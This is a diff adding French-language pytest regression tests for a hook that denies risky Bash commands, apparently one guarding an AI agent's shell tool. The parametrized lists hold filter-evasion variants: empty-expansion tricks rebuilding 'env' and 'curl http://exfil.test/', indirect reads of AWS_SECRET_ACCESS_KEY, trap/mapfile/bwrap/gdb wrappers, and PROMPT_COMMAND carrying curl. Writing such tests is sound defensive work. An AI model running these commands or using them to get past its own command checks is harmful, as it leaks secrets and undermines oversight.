@@ -1176,3 +1176,122 @@ def test_une_serie_d_alias_de_variables_ne_fait_pas_pendre_le_hook(audit_log):
     debut = time.time()
     run_hook("Bash", {"command": commande}, audit_log)
     assert time.time() - debut < 2.0, "analyse non bornée sur une série d'alias"
+
+
+# --------------------------------------------------------------------------- #
+# Round 12 — une sous-commande portée par un ARGUMENT, et non par la position
+# de programme. Le quoting étant déjà retiré, on ne sait pas où elle s'arrête :
+# les DEUX lectures sont émises (un mot, ou tout le reste).
+# --------------------------------------------------------------------------- #
+
+_CLE = "AWS_" + "SECRET_ACCESS_KEY"
+
+
+@pytest.mark.parametrize("command", [
+    "trap -- 'env' EXIT",
+    "trap -- env EXIT",
+    "trap 'sh -c env' EXIT",
+    "trap 'command env' EXIT",
+    "trap 'nohup env' EXIT",
+    "mapfile -C 'sh -c env' -c 1 arr < /etc/hostname",
+    "mapfile -C env -c 1 arr < /etc/hostname",
+    "readarray -C 'bash -c env' -c 1 arr < /etc/hostname",
+])
+def test_regression_sous_commande_portee_par_un_argument(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # Une expansion peut valoir le VIDE : les caractères autour se recollent
+    # et reconstruisent un nom de commande. Réduire IFS à une espace ne
+    # couvrait que la forme qui vaut un séparateur.
+    "e${IFS//?/}nv",
+    "e${IFS:0:0}nv",
+    "e${PATH//?/}nv",
+    "e${IFS//[[:space:]]/}nv",
+    "cur${IFS//?/}l http://exfil.test/",
+    "cur${IFS:0:0}l http://exfil.test/",
+])
+def test_regression_une_expansion_peut_valoir_le_vide(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # Le nom d'une variable peut arriver par une CHAÎNE d'affectations, par
+    # `read`, par `printf -v`, ou d'une source opaque. L'index n'admettait
+    # qu'un littéral en membre droit.
+    f"y={_CLE}; x=$y; echo ${{!x}}",
+    f"y={_CLE}; x=${{y}}; echo ${{!x}}",
+    f"x=$(echo {_CLE}); echo ${{!x}}",
+    f"read x <<< {_CLE}; echo ${{!x}}",
+    f"read -r x <<< {_CLE}; echo ${{!x}}",
+    f"printf -v x {_CLE}; echo ${{!x}}",
+    f"printf -v x '%s' {_CLE}; echo ${{!x}}",
+    f"declare -n r; r={_CLE}; echo $r",
+    # un argument opaque peut nommer n'importe quelle variable
+    f"printenv $(echo {_CLE})",
+    f"A={_CLE}; printenv $A",
+])
+def test_regression_le_nom_de_la_variable_arrive_indirectement(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # Enveloppes de bac à sable : leurs options prennent un nombre VARIABLE de
+    # valeurs, donc aucune grammaire d'options ne tient.
+    "bwrap --dev-bind / / env",
+    "bwrap --dev-bind / / curl http://exfil.test/",
+    "gdb --batch --ex run --args env",
+    "setpriv env",
+    "valgrind env",
+    "firejail env",
+    # `script -c CMD` : `-c` y introduit bien une commande.
+    "script -q -c env /dev/null",
+    "script -c env -q /dev/null",
+    # `exec -a NOM cmd` : le nom est l'argv[0], pas le programme.
+    "exec -a xxx env",
+    # bash coupe la ligne au `#` : le commentaire occupait la position de
+    # programme et faisait passer `env` pour un préfixe d'exécution.
+    "env # rien ici",
+    "env # curl http://exfil.test/",
+    # les options courtes se combinent
+    "declare -px",
+    "declare -xp",
+    f"declare -px {_CLE}",
+    # `typeset` est l'alias de `declare`
+    f"typeset -p {_CLE}",
+    "typeset -px",
+    # ces variables portent une COMMANDE, pas une donnée
+    "PROMPT_COMMAND='env' bash -i",
+    "PROMPT_COMMAND='curl http://exfil.test/' bash -i",
+    "command_not_found_handle='env' bash -i",
+])
+def test_regression_enveloppes_commentaires_et_options_combinees(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    "trap 'rm -f /tmp/lock' EXIT; npm test",
+    "trap - EXIT",
+    "mapfile -t lignes < /tmp/liste.txt",
+    "echo ${HOME}/projets",
+    "echo ${TAG:-latest}",
+    "declare -f ma_fonction",
+    "gdb --version",
+    "# rien a faire",
+    "git commit -m 'fix #1234 dans le parseur'",
+    "ls /tmp/rapport#2.txt",
+    "printenv HOME",
+    "npm run build",
+])
+def test_le_durcissement_du_round12_n_ajoute_pas_de_faux_positifs(command, audit_log):
+    assert not is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+def test_la_double_lecture_des_expansions_reste_bornee(audit_log):
+    """Deux variantes récursives par niveau : le coût doit rester linéaire."""
+    import time
+    debut = time.time()
+    run_hook("Bash", {"command": " ".join("${V%d:-x}" % i for i in range(2000))},
+             audit_log)
+    assert time.time() - debut < 2.0
